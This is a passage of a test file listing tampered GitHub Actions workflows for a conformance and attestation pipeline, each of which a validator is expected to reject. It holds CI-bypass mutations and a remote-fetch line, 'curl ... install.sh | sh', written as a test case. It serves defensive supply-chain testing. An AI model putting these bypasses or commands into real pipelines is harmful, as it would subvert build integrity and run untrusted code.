            '  validate-conformance-artifacts:',
            '    name: validate-conformance-artifacts',
            "    if: github.ref == 'refs/heads/main'",
            '    needs: platform-conformance',
            '    runs-on: ubuntu-24.04',
            '    environment: client-v1-conformance',
          ].join('\n'),
          [
            '  validate-conformance-artifacts:',
            '    name: validate-conformance-artifacts',
            "    if: github.ref == 'refs/heads/main'",
            '    needs: platform-conformance',
            '    runs-on: ubuntu-24.04',
            '    environment: unprotected',
          ].join('\n'),
        ),
      },
      {
        name: 'attestation leaves protected environment',
        workflow: TEST_PRODUCER_WORKFLOW_TEXT.replace(
          [
            '  attest-conformance-artifacts:',
            '    name: attest-conformance-artifacts',
            "    if: github.ref == 'refs/heads/main'",
            '    needs: validate-conformance-artifacts',
            '    runs-on: ubuntu-24.04',
            '    environment: client-v1-conformance',
          ].join('\n'),
          [
            '  attest-conformance-artifacts:',
            '    name: attest-conformance-artifacts',
            "    if: github.ref == 'refs/heads/main'",
            '    needs: validate-conformance-artifacts',
            '    runs-on: ubuntu-24.04',
            '    environment: unprotected',
          ].join('\n'),
        ),
      },
      {
        name: 'validation checkout uses unprotected dispatch input',
        workflow: TEST_PRODUCER_WORKFLOW_TEXT.replace(
          [
            '          repository: OpenCoven/sdk',
            `          ref: ${TEST_PROTECTED_VALIDATOR_REVISION}`,
            '          path: validator',
          ].join('\n'),
          [
            '          repository: OpenCoven/sdk',
            `          ref: ${TEST_VALIDATOR_INPUT}`,
            '          path: validator',
          ].join('\n'),
        ),
      },
      {
        name: 'wrong protected validator variable',
        workflow: TEST_PRODUCER_WORKFLOW_TEXT.replaceAll(
          'CLIENT_V1_CONFORMANCE_VALIDATOR_REVISION',
          'UNREVIEWED_VALIDATOR_REVISION',
        ),
      },
      {
        name: 'missing Unix Rust installation',
        workflow: TEST_PRODUCER_WORKFLOW_TEXT.replace(
          [
            '      - name: Install frozen Unix Rust',
            "        if: matrix.platform != 'win32-x64'",
            `        run: ${yamlSingleQuoted(TEST_UNIX_RUST_INSTALL_COMMAND)}`,
            '',
          ].join('\n'),
          '',
        ),
      },
      {
        name: 'conditional validation control',
        workflow: TEST_PRODUCER_WORKFLOW_TEXT.replace(
          [
            '      - name: Validate exact SDK schema, parser, and scanner',
            '        id: validate',
          ].join('\n'),
          [
            '      - name: Validate exact SDK schema, parser, and scanner',
            '        if: false',
            '        id: validate',
          ].join('\n'),
        ),
      },
      {
        name: 'failure-tolerant validation control',
        workflow: TEST_PRODUCER_WORKFLOW_TEXT.replace(
          [
            '      - name: Validate exact SDK schema, parser, and scanner',
            '        id: validate',
            '        shell: bash',
          ].join('\n'),
          [
            '      - name: Validate exact SDK schema, parser, and scanner',
            '        id: validate',
            '        shell: bash',
            '        continue-on-error: true',
          ].join('\n'),
        ),
      },
      {
        name: 'commented and unreachable validation controls',
        workflow: TEST_PRODUCER_WORKFLOW_TEXT.replace(
          `        run: 'parsePlatformEvidence(text, \`\${platform} uploaded artifact\`, schema); scanConformanceEvidence(record); createHash(''sha256'').update(bytes).digest(''hex''); serializeCanonicalJson(record) !== text'`,
          `        run: '/* parsePlatformEvidence( */ JSON.parse(text); /* scanConformanceEvidence(record) */ false && serializeCanonicalJson(record) !== text; createHash(''sha256'').update(bytes).digest(''hex'')'`,
        ),
      },
      {
        name: 'conditional attestation control',
        workflow: TEST_PRODUCER_WORKFLOW_TEXT.replace(
          '      - name: Compare freshly downloaded artifact digests\n        shell: bash',
          '      - name: Compare freshly downloaded artifact digests\n        if: false\n        shell: bash',
        ),
      },
      {
        name: 'failure-tolerant attestation control',
        workflow: TEST_PRODUCER_WORKFLOW_TEXT.replace(
          '      - name: Compare freshly downloaded artifact digests\n        shell: bash',
          '      - name: Compare freshly downloaded artifact digests\n        shell: bash\n        continue-on-error: true',
        ),
      },
      {
        name: 'attestation digest detached from validation output',
        workflow: TEST_PRODUCER_WORKFLOW_TEXT.replace(
          '          OPENCOVEN_DARWIN_ARM64_SHA256: ${{ needs[\'validate-conformance-artifacts\'].outputs.darwin_arm64_sha256 }}',
          `          OPENCOVEN_DARWIN_ARM64_SHA256: ${TEST_VALIDATOR_INPUT}`,
        ),
      },
      {
        name: 'wrong download action pin',
        workflow: TEST_PRODUCER_WORKFLOW_TEXT.replaceAll(
          DOWNLOAD_ARTIFACT_ACTION,
          'actions/download-artifact@4444444444444444444444444444444444444444',
        ),
      },
      {
        name: 'wrong attestation action pin',
        workflow: TEST_PRODUCER_WORKFLOW_TEXT.replaceAll(
          ATTEST_BUILD_PROVENANCE_ACTION,
          'actions/attest-build-provenance@5555555555555555555555555555555555555555',
        ),
      },
      {
        name: 'optional validator revision input',
        workflow: TEST_PRODUCER_WORKFLOW_TEXT.replace(
          '        required: true',
          '        required: false',
        ),
      },
      {
        name: 'defaulted validator revision input',
        workflow: TEST_PRODUCER_WORKFLOW_TEXT.replace(
          '        type: string',
          '        type: string\n        default: main',
        ),
      },
      {
        name: 'shallow Chat checkouts',
        workflow: TEST_PRODUCER_WORKFLOW_TEXT.replaceAll(
          '          fetch-depth: 0',
          '          fetch-depth: 1',
        ),
      },
      {
        name: 'substituted Windows supervisor builder runner',
        workflow: TEST_PRODUCER_WORKFLOW_TEXT.replace(
          '    runs-on: macos-latest',
          '    runs-on: macos-15',
        ),
      },
      {
        name: 'missing Windows supervisor dependency',
        workflow: TEST_PRODUCER_WORKFLOW_TEXT.replace(
          '    needs: windows-supervisor\n',
          '',
        ),
      },
      {
        name: 'substituted Windows supervisor build helper',
        workflow: TEST_PRODUCER_WORKFLOW_TEXT.replace(
          '        run: bash scripts/phase1-windows-supervisor-build.sh',
          '        run: bash scripts/unreviewed-supervisor-build.sh',
        ),
      },
      {
        name: 'substituted reviewed SDK checkout',
        workflow: TEST_PRODUCER_WORKFLOW_TEXT.replace(
          '          path: .phase1-counterparts/sdk',
          '          path: .phase1-counterparts/unreviewed-sdk',
        ),
      },
      {
        name: 'validator checkout does not use dispatch revision',
        workflow: TEST_PRODUCER_WORKFLOW_TEXT.replace(
          '          ref: ${{ inputs.validator_revision }}',
          '          ref: main',
        ),
      },
      {
        name: 'Windows-unsafe toolchain resolution',
        workflow: TEST_PRODUCER_WORKFLOW_TEXT.replace(
          'resolveExecutableInvocation',
          'unsafeExecutableInvocation',
        ),
      },
      {
        name: 'POSIX rustc proxy canonicalized as rustup',
        workflow: TEST_PRODUCER_WORKFLOW_TEXT.replace(
          "run(''rustc'', [''--version''])",
          "run(''rustup'', [''run'', ''1.95.0'', ''rustc'', ''--version''])",
        ),
      },
      {
        name: 'premature Tauri check before the frozen producer install',
        workflow: TEST_PRODUCER_WORKFLOW_TEXT.replace(
          "|| !run(''rustc'', [''--version'']).startsWith(''rustc 1.95.0 ''))",
          [
            "|| !run(''rustc'', [''--version'']).startsWith(''rustc 1.95.0 '')",
            "|| run(''pnpm'', [''exec'', ''tauri'', ''--version''])",
            "!== ''tauri-cli 2.11.4'')",
          ].join(' '),
        ),
      },
      {
        name: 'ambient PATH forwarded to the Unix producer',
        workflow: replaceWorkflowRun(
          TEST_PRODUCER_WORKFLOW_TEXT,
          TEST_UNIX_PRODUCTION_COMMAND,
          TEST_UNIX_PRODUCTION_COMMAND.replace(
            '--tool-path "${{ steps[\'unix-tool-path\'].outputs.tool_path }}"',
            '--tool-path "$PATH"',
          ),
        ),
      },
      {
        name: 'braced ambient PATH forwarded to the Unix producer',
        workflow: replaceWorkflowRun(
          TEST_PRODUCER_WORKFLOW_TEXT,
          TEST_UNIX_PRODUCTION_COMMAND,
          TEST_UNIX_PRODUCTION_COMMAND.replace(
            '--tool-path "${{ steps[\'unix-tool-path\'].outputs.tool_path }}"',
            '--tool-path "${PATH}"',
          ),
        ),
        synchronizedScriptDigest: {
          field: 'unixProductionScriptSha256',
          step: 'Run supervised Unix production and handoff',
        },
        expectedError: /exact canonical Unix production source/u,
      },
      {
        name: 'duplicate last-write-wins ambient Unix tool-path override',
        workflow: replaceWorkflowRun(
          TEST_PRODUCER_WORKFLOW_TEXT,
          TEST_UNIX_PRODUCTION_COMMAND,
          TEST_UNIX_PRODUCTION_COMMAND.replace(
            '--validator-revision "$OPENCOVEN_VALIDATOR_REVISION"',
            [
              '--tool-path "${PATH}"',
              '--validator-revision "$OPENCOVEN_VALIDATOR_REVISION"',
            ].join(' '),
          ),
        ),
        synchronizedScriptDigest: {
          field: 'unixProductionScriptSha256',
          step: 'Run supervised Unix production and handoff',
        },
      },
      {
        name: 'escaped duplicate ambient Unix tool-path override',
        workflow: replaceWorkflowRun(
          TEST_PRODUCER_WORKFLOW_TEXT,
          TEST_UNIX_PRODUCTION_COMMAND,
          TEST_UNIX_PRODUCTION_COMMAND.replace(
            '--validator-revision "$OPENCOVEN_VALIDATOR_REVISION"',
            [
              '--tool\\-path "${PATH}"',
              '--validator-revision "$OPENCOVEN_VALIDATOR_REVISION"',
            ].join(' '),
          ),
        ),
        synchronizedScriptDigest: {
          field: 'unixProductionScriptSha256',
          step: 'Run supervised Unix production and handoff',
        },
        expectedError: /exact canonical Unix production source/u,
      },
      {
        name: 'duplicate fallback Unix tool-path override',
        workflow: replaceWorkflowRun(
          TEST_PRODUCER_WORKFLOW_TEXT,
          TEST_UNIX_PRODUCTION_COMMAND,
          TEST_UNIX_PRODUCTION_COMMAND.replace(
            '--validator-revision "$OPENCOVEN_VALIDATOR_REVISION"',
            [
              '--tool-path "${PATH:-/usr/bin}"',
              '--validator-revision "$OPENCOVEN_VALIDATOR_REVISION"',
            ].join(' '),
          ),
        ),
        synchronizedScriptDigest: {
          field: 'unixProductionScriptSha256',
          step: 'Run supervised Unix production and handoff',
        },
      },
      {
        name: 'environment-indirected Unix tool path',
        workflow: replaceWorkflowRun(
          TEST_PRODUCER_WORKFLOW_TEXT,
          TEST_UNIX_PRODUCTION_COMMAND,
          TEST_UNIX_PRODUCTION_COMMAND.replace(
            '--tool-path "${{ steps[\'unix-tool-path\'].outputs.tool_path }}"',
            '--tool-path "$OPENCOVEN_TOOL_PATH"',
          ),
        ),
        synchronizedScriptDigest: {
          field: 'unixProductionScriptSha256',
          step: 'Run supervised Unix production and handoff',
        },
      },
      {
        name: 'alternately quoted reviewed Unix tool path',
        workflow: replaceWorkflowRun(
          TEST_PRODUCER_WORKFLOW_TEXT,
          TEST_UNIX_PRODUCTION_COMMAND,
          TEST_UNIX_PRODUCTION_COMMAND.replace(
            '--tool-path "${{ steps[\'unix-tool-path\'].outputs.tool_path }}"',
            '--tool-path \'${{ steps[\'unix-tool-path\'].outputs.tool_path }}\'',
          ),
        ),
        synchronizedScriptDigest: {
          field: 'unixProductionScriptSha256',
          step: 'Run supervised Unix production and handoff',
        },
      },
      {
        name: 'equals-spelled reviewed Unix tool path',
        workflow: replaceWorkflowRun(
          TEST_PRODUCER_WORKFLOW_TEXT,
          TEST_UNIX_PRODUCTION_COMMAND,
          TEST_UNIX_PRODUCTION_COMMAND.replace(
            '--tool-path "${{ steps[\'unix-tool-path\'].outputs.tool_path }}"',
            '--tool-path="${{ steps[\'unix-tool-path\'].outputs.tool_path }}"',
          ),
        ),
        synchronizedScriptDigest: {
          field: 'unixProductionScriptSha256',
          step: 'Run supervised Unix production and handoff',
        },
      },
      {
        name: 'missing reviewed Unix tool-path computation',
        workflow: TEST_PRODUCER_WORKFLOW_TEXT.replace(
          [
            '      - name: Compute reviewed Unix tool path',
            '        id: unix-tool-path',
            "        if: matrix.platform != 'win32-x64'",
            `        run: ${yamlSingleQuoted(TEST_UNIX_TOOL_PATH_COMMAND)}`,
            '',
          ].join('\n'),
          '',
        ),
      },
      {
        name: 'renamed reviewed Unix tool-path step',
        workflow: TEST_PRODUCER_WORKFLOW_TEXT.replace(
          '      - name: Compute reviewed Unix tool path',
          '      - name: Compute unreviewed Unix tool path',
        ),
      },
      {
        name: 'renamed reviewed Unix tool-path step id',
        workflow: TEST_PRODUCER_WORKFLOW_TEXT.replace(
          '        id: unix-tool-path',
          '        id: reviewed-tool-path',
        ),
      },
      {
        name: 'renamed reviewed Unix tool-path output',
        workflow: TEST_PRODUCER_WORKFLOW_TEXT.replace(
          yamlSingleQuoted(TEST_UNIX_TOOL_PATH_COMMAND),
          yamlSingleQuoted(
            TEST_UNIX_TOOL_PATH_COMMAND.replace(
              '\'tool_path=\' + toolPath',
              '\'reviewed_path=\' + toolPath',
            ),
          ),
        ),
      },
      {
        name: 'detached reviewed Unix tool-path output',
        workflow: replaceWorkflowRun(
          TEST_PRODUCER_WORKFLOW_TEXT,
          TEST_UNIX_PRODUCTION_COMMAND,
          TEST_UNIX_PRODUCTION_COMMAND.replace(
            'steps[\'unix-tool-path\'].outputs.tool_path',
            'steps[\'unix-tool-path\'].outputs.reviewed_path',
          ),
        ),
      },
      {
        name: 'disabled reviewed Unix tool-path computation',
        workflow: TEST_PRODUCER_WORKFLOW_TEXT.replace(
          [
            '      - name: Compute reviewed Unix tool path',
            '        id: unix-tool-path',
            "        if: matrix.platform != 'win32-x64'",
          ].join('\n'),
          [
            '      - name: Compute reviewed Unix tool path',
            '        id: unix-tool-path',
            '        if: false',
          ].join('\n'),
        ),
      },
      {
        name: 'reordered reviewed Unix tool-path computation',
        workflow: TEST_PRODUCER_WORKFLOW_TEXT.replace(
          [
            '      - name: Prepare trusted Unix supervisor',
            "        if: matrix.platform != 'win32-x64'",
            '        shell: bash',
            `        run: ${yamlSingleQuoted(TEST_UNIX_SUPERVISOR_PREPARATION_COMMAND)}`,
            '      - name: Compute reviewed Unix tool path',
            '        id: unix-tool-path',
            "        if: matrix.platform != 'win32-x64'",
            `        run: ${yamlSingleQuoted(TEST_UNIX_TOOL_PATH_COMMAND)}`,
          ].join('\n'),
          [
            '      - name: Compute reviewed Unix tool path',
            '        id: unix-tool-path',
            "        if: matrix.platform != 'win32-x64'",
            `        run: ${yamlSingleQuoted(TEST_UNIX_TOOL_PATH_COMMAND)}`,
            '      - name: Prepare trusted Unix supervisor',
            "        if: matrix.platform != 'win32-x64'",
            '        shell: bash',
            `        run: ${yamlSingleQuoted(TEST_UNIX_SUPERVISOR_PREPARATION_COMMAND)}`,
          ].join('\n'),
        ),
      },
      {
        name: 'duplicated reviewed Unix tool-path computation',
        workflow: TEST_PRODUCER_WORKFLOW_TEXT.replace(
          [
            '      - name: Compute reviewed Unix tool path',
            '        id: unix-tool-path',
            "        if: matrix.platform != 'win32-x64'",
            `        run: ${yamlSingleQuoted(TEST_UNIX_TOOL_PATH_COMMAND)}`,
          ].join('\n'),
          [
            '      - name: Compute reviewed Unix tool path',
            '        id: unix-tool-path',
            "        if: matrix.platform != 'win32-x64'",
            `        run: ${yamlSingleQuoted(TEST_UNIX_TOOL_PATH_COMMAND)}`,
            '      - name: Compute reviewed Unix tool path',
            '        id: unix-tool-path-copy',
            "        if: matrix.platform != 'win32-x64'",
            `        run: ${yamlSingleQuoted(TEST_UNIX_TOOL_PATH_COMMAND)}`,
          ].join('\n'),
        ),
      },
      {
        name: 'extra Unix tool-path computation',
        workflow: TEST_PRODUCER_WORKFLOW_TEXT.replace(
          '      - name: Run supervised Unix production and handoff',
          [
            '      - name: Compute alternate Unix tool path',
            '        id: alternate-unix-tool-path',
            "        if: matrix.platform != 'win32-x64'",
            `        run: ${yamlSingleQuoted(TEST_UNIX_TOOL_PATH_COMMAND)}`,
            '      - name: Run supervised Unix production and handoff',
          ].join('\n'),
        ),
      },
      {
        name: 'unsafe Unix executable-resolution substitution',
        workflow: TEST_PRODUCER_WORKFLOW_TEXT.replace(
          yamlSingleQuoted(TEST_UNIX_TOOL_PATH_COMMAND),
          yamlSingleQuoted(
            TEST_UNIX_TOOL_PATH_COMMAND.replace(
              'resolveUnixToolPath',
              'resolveExecutableInvocation',
            ),
          ),
        ),
      },
      {
        name: 'altered reviewed Unix required-command list',
        workflow: TEST_PRODUCER_WORKFLOW_TEXT.replace(
          yamlSingleQuoted(TEST_UNIX_TOOL_PATH_COMMAND),
          yamlSingleQuoted(
            TEST_UNIX_TOOL_PATH_COMMAND.replace(
              '[\'node\', \'corepack\', \'rustup\']',
              '[\'node\', \'corepack\', \'cargo\']',
            ),
          ),
        ),
      },
      {
        name: 'Windows checkout permits CRLF conversion',
        workflow: TEST_PRODUCER_WORKFLOW_TEXT.replace(
          [
            '    env:',
            "      GIT_CONFIG_COUNT: '1'",
            '      GIT_CONFIG_KEY_0: core.autocrlf',
            "      GIT_CONFIG_VALUE_0: 'false'",
          ].join('\n'),
          '',
        ),
      },
      {
        name: 'disabled supervised Windows bootstrap',
        workflow: TEST_PRODUCER_WORKFLOW_TEXT.replace(
          [
            '      - name: Bootstrap supervised Windows conformance',
            "        if: matrix.platform == 'win32-x64'",
          ].join('\n'),
          [
            '      - name: Bootstrap supervised Windows conformance',
            '        if: false',
          ].join('\n'),
        ),
      },
      {
        name: 'unreachable Windows validator comparison',
        workflow: TEST_PRODUCER_WORKFLOW_TEXT.replace(
          '$validatorRevision -cne $protectedValidatorRevision',
          '$false -and $validatorRevision -cne $protectedValidatorRevision',
        ),
      },
      {
        name: 'substituted Windows bootstrap shell',
        workflow: TEST_PRODUCER_WORKFLOW_TEXT.replace(
          [
            '      - name: Bootstrap supervised Windows conformance',
            "        if: matrix.platform == 'win32-x64'",
            '        shell: pwsh',
          ].join('\n'),
          [
            '      - name: Bootstrap supervised Windows conformance',
            "        if: matrix.platform == 'win32-x64'",
            '        shell: bash',
          ].join('\n'),
        ),
      },
      {
        name: 'Windows bootstrap falls back to LASTEXITCODE',
        workflow: mutateWindowsChildBootstrap((source) =>
          source.replaceAll(
            '$process.ExitCode',
            '$LASTEXITCODE',
          ),
        ),
      },
      {
        name: 'Windows bootstrap uses lowercase LASTEXITCODE',
        workflow: mutateWindowsChildBootstrap((source) =>
          source.replace(
            'if ($process.ExitCode -ne 0)',
            'if ($lastExitCode -ne 0)',
          ),
        ),
        synchronizedScriptDigest: {
          field: 'windowsBootstrapScriptSha256',
          step: 'Bootstrap supervised Windows conformance',
        },
      },
      {
        name: 'Windows bootstrap uses mixed-case LASTEXITCODE',
        workflow: mutateWindowsChildBootstrap((source) =>
          source.replace(
            'if ($process.ExitCode -ne 0)',
            'if ($LaStExItCoDe -ne 0)',
          ),
        ),
        synchronizedScriptDigest: {
          field: 'windowsBootstrapScriptSha256',
          step: 'Bootstrap supervised Windows conformance',
        },
      },
      {
        name: 'Windows bootstrap uses global LASTEXITCODE',
        workflow: mutateWindowsChildBootstrap((source) =>
          [
            source,
            'if ($global:LASTEXITCODE -ne 0) { throw "Global child failure." }',
          ].join('\n'),
        ),
        synchronizedScriptDigest: {
          field: 'windowsBootstrapScriptSha256',
          step: 'Bootstrap supervised Windows conformance',
        },
        expectedError: /exact canonical Windows child bootstrap source/u,
      },
      {
        name: 'Windows bootstrap uses script LASTEXITCODE',
        workflow: mutateWindowsChildBootstrap((source) =>
          [
            source,
            'if ($script:LASTEXITCODE -ne 0) { throw "Script child failure." }',
          ].join('\n'),
        ),
        synchronizedScriptDigest: {
          field: 'windowsBootstrapScriptSha256',
          step: 'Bootstrap supervised Windows conformance',
        },
        expectedError: /exact canonical Windows child bootstrap source/u,
      },
      {
        name: 'Windows bootstrap reassigns the reviewed child before writing it',
        workflow: replaceWorkflowRun(
          TEST_PRODUCER_WORKFLOW_TEXT,
          TEST_WINDOWS_BOOTSTRAP_COMMAND,
          TEST_WINDOWS_BOOTSTRAP_COMMAND.replace(
            [
              '  [IO.File]::WriteAllText(',
              '    $childBootstrapPath,',
              '    $childBootstrap,',
            ].join('\n'),
            [
              "  $childBootstrap = 'Write-Output evil'",
              '  [IO.File]::WriteAllText(',
              '    $childBootstrapPath,',
              '    $childBootstrap,',
            ].join('\n'),
          ),
        ),
        synchronizedScriptDigest: {
          field: 'windowsBootstrapScriptSha256',
          step: 'Bootstrap supervised Windows conformance',
        },
        expectedError: /exact canonical Windows bootstrap source/u,
      },
      {
        name: 'Windows process launcher quotes disposal as inert text',
        workflow: mutateWindowsChildBootstrap((source) =>
          source.replace(
            '$process.Dispose()',
            '\'$process.Dispose()\'',
          ),
        ),
        synchronizedScriptDigest: {
          field: 'windowsBootstrapScriptSha256',
          step: 'Bootstrap supervised Windows conformance',
        },
        expectedError: /exact canonical Windows child bootstrap source/u,
      },
      {
        name: 'Windows process launcher uses quoted dynamic invocation',
        workflow: mutateWindowsChildBootstrap((source) =>
          [
            source,
            "& 'Invoke-Checked' -FilePath cmd.exe -ArgumentList @('/c', 'exit 0') -Label 'Dynamic command interpreter'",
          ].join('\n'),
        ),
        synchronizedScriptDigest: {
          field: 'windowsBootstrapScriptSha256',
          step: 'Bootstrap supervised Windows conformance',
        },
        expectedError: /exact canonical Windows child bootstrap source/u,
      },
      {
        name: 'Windows process launcher invokes cmd.exe',
        workflow: mutateWindowsChildBootstrap((source) =>
          source.replace(
            "if ((& $node $pnpmCli --version).Trim() -ne '10.34.0') {",
            [
              "Invoke-Checked -FilePath cmd.exe -ArgumentList @('/c', 'exit 0') -Label 'Command interpreter'",
              "if ((& $node $pnpmCli --version).Trim() -ne '10.34.0') {",
            ].join('\n'),
          ),
        ),
        synchronizedScriptDigest: {
          field: 'windowsBootstrapScriptSha256',
          step: 'Bootstrap supervised Windows conformance',
        },
        expectedError: /exact canonical Windows child bootstrap source/u,
      },
      {
        name: 'Windows process launcher is reassigned through Set-Variable alias',
        workflow: mutateWindowsChildBootstrap((source) =>
          source.replace(
            "$node = Join-Path $nodeRoot 'node.exe'",
            [
              "$node = Join-Path $nodeRoot 'node.exe'",
              "sv node 'cmd.exe'",
            ].join('\n'),
          ),
        ),
        synchronizedScriptDigest: {
          field: 'windowsBootstrapScriptSha256',
          step: 'Bootstrap supervised Windows conformance',
        },
        expectedError: /exact canonical Windows child bootstrap source/u,
      },
      {
        name: 'Windows process launcher variable resolves to cmd.exe',
        workflow: mutateWindowsChildBootstrap((source) =>
          source.replace(
            "$node = Join-Path $nodeRoot 'node.exe'",
            "$node = Join-Path $nodeRoot 'cmd.exe'",
          ),
        ),
        synchronizedScriptDigest: {
          field: 'windowsBootstrapScriptSha256',
          step: 'Bootstrap supervised Windows conformance',
        },
      },
      {
        name: 'Windows process launcher variable is later overridden by cmd.exe',
        workflow: mutateWindowsChildBootstrap((source) =>
          source.replace(
            "$node = Join-Path $nodeRoot 'node.exe'",
            [
              "$node = Join-Path $nodeRoot 'node.exe'",
              "$script:node = 'cmd.exe'",
            ].join('\n'),
          ),
        ),
        synchronizedScriptDigest: {
          field: 'windowsBootstrapScriptSha256',
          step: 'Bootstrap supervised Windows conformance',
        },
      },
      {
        name: 'Windows process launcher invokes cmd',
        workflow: mutateWindowsChildBootstrap((source) =>
          source.replace(
            "if ((& $node $pnpmCli --version).Trim() -ne '10.34.0') {",
            [
              "Invoke-Checked -FilePath cmd -ArgumentList @('/c', 'exit 0') -Label 'Command interpreter'",
              "if ((& $node $pnpmCli --version).Trim() -ne '10.34.0') {",
            ].join('\n'),
          ),
        ),
        synchronizedScriptDigest: {
          field: 'windowsBootstrapScriptSha256',
          step: 'Bootstrap supervised Windows conformance',
        },
      },
      {
        name: 'Windows process launcher invokes a cmd shim',
        workflow: mutateWindowsChildBootstrap((source) =>
          source.replace(
            "if ((& $node $pnpmCli --version).Trim() -ne '10.34.0') {",
            [
              "Invoke-Checked -FilePath 'pnpm.cmd' -ArgumentList @('--version') -Label 'Command shim'",
              "if ((& $node $pnpmCli --version).Trim() -ne '10.34.0') {",
            ].join('\n'),
          ),
        ),
        synchronizedScriptDigest: {
          field: 'windowsBootstrapScriptSha256',
          step: 'Bootstrap supervised Windows conformance',
        },
      },
      {
        name: 'Windows process launcher invokes a batch file',
        workflow: mutateWindowsChildBootstrap((source) =>
          source.replace(
            "if ((& $node $pnpmCli --version).Trim() -ne '10.34.0') {",
            [
              "Invoke-Checked -FilePath 'setup.bat' -ArgumentList @() -Label 'Batch file'",
              "if ((& $node $pnpmCli --version).Trim() -ne '10.34.0') {",
            ].join('\n'),
          ),
        ),
        synchronizedScriptDigest: {
          field: 'windowsBootstrapScriptSha256',
          step: 'Bootstrap supervised Windows conformance',
        },
      },
      {
        name: 'Windows process launcher executes an npm cmd shim',
        workflow: mutateWindowsChildBootstrap((source) =>
          source.replace(
            "$npmCli = Join-Path $nodeRoot 'node_modules\\npm\\bin\\npm-cli.js'",
            "$npmCli = Join-Path $nodeRoot 'npm.cmd'",
          ),
        ),
        synchronizedScriptDigest: {
          field: 'windowsBootstrapScriptSha256',
          step: 'Bootstrap supervised Windows conformance',
        },
      },
      {
        name: 'Windows npm CLI binding is spoofed by a comment',
        workflow: mutateWindowsChildBootstrap((source) =>
          [
            source.replace(
              "$npmCli = Join-Path $nodeRoot 'node_modules\\npm\\bin\\npm-cli.js'",
              "$npmCli = Join-Path $nodeRoot 'evil.cjs'",
            ),
            "<# $npmCli = Join-Path $nodeRoot 'node_modules\\npm\\bin\\npm-cli.js' #>",
          ].join('\n'),
        ),
        synchronizedScriptDigest: {
          field: 'windowsBootstrapScriptSha256',
          step: 'Bootstrap supervised Windows conformance',
        },
        expectedError: /exact canonical Windows child bootstrap source/u,
      },
      {
        name: 'Windows process launcher executes a pnpm bat shim',
        workflow: mutateWindowsChildBootstrap((source) =>
          source.replace(
            "$pnpmCli = Join-Path $pnpmRoot 'node_modules\\pnpm\\bin\\pnpm.cjs'",
            "$pnpmCli = Join-Path $pnpmRoot 'pnpm.bat'",
          ),
        ),
        synchronizedScriptDigest: {
          field: 'windowsBootstrapScriptSha256',
          step: 'Bootstrap supervised Windows conformance',
        },
      },
      {
        name: 'Windows pnpm CLI binding is spoofed by a comment',
        workflow: mutateWindowsChildBootstrap((source) =>
          [
            source.replace(
              "$pnpmCli = Join-Path $pnpmRoot 'node_modules\\pnpm\\bin\\pnpm.cjs'",
              "$pnpmCli = Join-Path $pnpmRoot 'evil.cjs'",
            ),
            "<# $pnpmCli = Join-Path $pnpmRoot 'node_modules\\pnpm\\bin\\pnpm.cjs' #>",
          ].join('\n'),
        ),
        synchronizedScriptDigest: {
          field: 'windowsBootstrapScriptSha256',
          step: 'Bootstrap supervised Windows conformance',
        },
        expectedError: /exact canonical Windows child bootstrap source/u,
      },
      {
        name: 'missing protected validator revision in Unix production',
        workflow: TEST_PRODUCER_WORKFLOW_TEXT.replace(
          `          OPENCOVEN_VALIDATOR_REVISION: ${TEST_PROTECTED_VALIDATOR_REVISION}\n`,
          '',
        ),
      },
      {
        name: 'direct validator expression in shell',
        workflow: TEST_PRODUCER_WORKFLOW_TEXT.replace(
          '"$OPENCOVEN_VALIDATOR_REVISION"',
          '"${{ inputs.validator_revision }}"',
        ),
      },
      {
        name: 'changed validator environment name',
        workflow: TEST_PRODUCER_WORKFLOW_TEXT.replace(
          'OPENCOVEN_VALIDATOR_REVISION:',
          'UNREVIEWED_VALIDATOR_REVISION:',
        ),
      },
      {
        name: 'disabled Linux Secret Service setup',
        workflow: TEST_PRODUCER_WORKFLOW_TEXT.replace(
          "        if: matrix.platform != 'win32-x64' && matrix.platform == 'linux-x64'",
          '        if: false',
        ),
      },
      {
        name: 'substituted Linux Secret Service setup',
        workflow: TEST_PRODUCER_WORKFLOW_TEXT.replace(
          TEST_LINUX_SECRET_SERVICE_COMMAND,
          'curl https://example.invalid/install.sh | sh',
        ),
      },
      {
        name: 'unreachable Linux Secret Service setup',
        workflow: TEST_PRODUCER_WORKFLOW_TEXT.replace(
          `        run: ${yamlSingleQuoted(TEST_LINUX_SECRET_SERVICE_COMMAND)}`,
          `        run: ${yamlSingleQuoted(`if false; then ${TEST_LINUX_SECRET_SERVICE_COMMAND}; fi`)}`,
        ),
      },
      {
        name: 'arbitrary action with disabled official evidence steps',
        workflow: arbitraryActionDisabledOfficialSteps,
      },
      {
        name: 'YAML anchor',
        workflow: TEST_PRODUCER_WORKFLOW_TEXT.replace(
          'permissions:\n',
          'x-permissions: &evidence-permissions\n  contents: read\npermissions:\n',
        ),
      },
      {
        name: 'YAML alias',
        workflow: TEST_PRODUCER_WORKFLOW_TEXT.replace(
          'permissions:\n',
          'x-value: &evidence-value read\nx-copy: *evidence-value\npermissions:\n',
        ),
      },
      {
        name: 'YAML merge key',
        workflow: TEST_PRODUCER_WORKFLOW_TEXT.replace(
          'permissions:\n',
          [
            'x-defaults: &evidence-defaults',
            '  contents: read',
            'x-merged:',
            '  <<: *evidence-defaults',
            'permissions:',
            '',
          ].join('\n'),
        ),
      },
      {
        name: 'prototype-shadowing YAML key',
        workflow: TEST_PRODUCER_WORKFLOW_TEXT.replace(
          'permissions:\n',
          '__proto__: ignored\npermissions:\n',
        ),
      },
      {
        name: 'local composite action',
        workflow: beforeProtectedUpload(TEST_PRODUCER_WORKFLOW_TEXT, [
          '      - uses: ./.github/actions/fabricate-evidence',
        ]),
      },
      {
        name: 'local reusable workflow',
        workflow: TEST_PRODUCER_WORKFLOW_TEXT.replace(
          [
            '  aggregate-conformance:',
            '    name: aggregate-conformance',
            "    if: github.ref == 'refs/heads/main'",
            '    needs: attest-conformance-artifacts',
            '    runs-on: ubuntu-24.04',
            '    permissions: {}',
            '    steps:',
            '      - name: Confirm protected evidence matrix',
            '        run: echo "protected evidence matrix completed"',
          ].join('\n'),
          [
            '  aggregate-conformance:',
            "    if: github.ref == 'refs/heads/main'",
            '    needs: attest-conformance-artifacts',
            '    uses: ./.github/workflows/aggregate.yml',
          ].join('\n'),
        ),
      },
      {
        name: 'multiline curl artifact upload',
        workflow: beforeProtectedUpload(TEST_PRODUCER_WORKFLOW_TEXT, [
          '      - name: Upload replacement through the API',
          '        run: >-',
          '          curl --fail-with-body --request POST',
          '          https://api.github.com/repos/OpenCoven/chat/actions/artifacts',
        ]),
      },
      {
        name: 'multiline gh attestation call',
        workflow: beforeProtectedUpload(TEST_PRODUCER_WORKFLOW_TEXT, [
